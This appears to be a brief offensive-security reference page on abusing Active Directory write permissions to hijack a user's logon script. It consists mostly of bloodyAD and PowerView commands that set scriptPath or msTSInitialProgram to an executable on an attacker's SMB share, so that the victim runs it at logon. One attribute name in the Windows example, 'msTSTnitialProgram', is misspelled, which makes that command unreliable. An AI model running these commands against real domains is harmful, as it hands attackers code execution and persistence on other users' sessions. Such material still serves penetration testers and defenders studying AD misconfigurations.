This abuse can be carried out when controlling an object that has a `GenericAll or GenericWrite` over the target, or a `WriteProperty` premission over the target's logon script attribute (i.e. `scriptPath or msTSInitialProgram`).

The attacker can make the user execute a custom script at logon.
=== "UNIX-like"
    This can be achieved with bloodyAD.
    ```bash
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSWorkDirectory -v 'C:\'

    # or
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe'
    ```
=== "Windows"
    This can be achieved with Set-DomainObject (PowerView module).
    ```bash
    Set-DomainObject testuser -Set @{'msTSTnitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose

    Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
    ```